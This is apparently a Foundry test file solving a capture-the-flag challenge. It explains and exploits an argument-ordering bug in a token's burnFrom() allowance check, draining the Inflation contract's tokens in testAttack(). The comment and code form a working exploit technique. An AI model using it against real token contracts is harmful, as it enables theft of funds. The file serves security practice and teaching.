// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "forge-std/Test.sol";
import "../contracts/Inflation.sol";
import "../contracts/Setup.sol";

contract InflationTest is Test {
    Setup setup;
    InflationaryToken inflationaryToken;
    Inflation inflation;

    function setUp() external {
        setup = new Setup();
        inflation = setup.instance();
        inflationaryToken = inflation.token();
    }

    /**
    The vulnerability is in the `burnFrom()` function, which calls `_spendAllowance()` with a wrong ordering of arguments - it's mixed up the arguments for spender and owner.

    What it means is, although spender burns owner's tokens, the owner's allowance for spender is deducted. And since allowance can be given irrespective of actual balance, attacker can drain all funds from Inflation:

    1. Calculate inflationary token that can be burnt
    2. Approve above balance to Inflation contract
    3. Call `burnFrom()`, which is intended to burn Inflation contract's approved amount to attacker, but actually burns the opposite, i.e, burns Inflation's tokens that it got allowance for in #2..
     */
    function testAttack() external {
        // ATTACK

        // 1
        uint256 balanceToBurn = inflationaryToken.balanceOf(
            address(inflation)
        ) +
            ((inflationaryToken.rate() * inflationaryToken.totalSupply()) /
                100);

        // 2
        inflationaryToken.approve(address(inflation), balanceToBurn);

        // 3
        inflationaryToken.burnFrom(address(inflation), balanceToBurn);

        // CHECK ATTACK SUCCESS
        require(setup.isSolved(), "NOT SOLVED");
    }
}
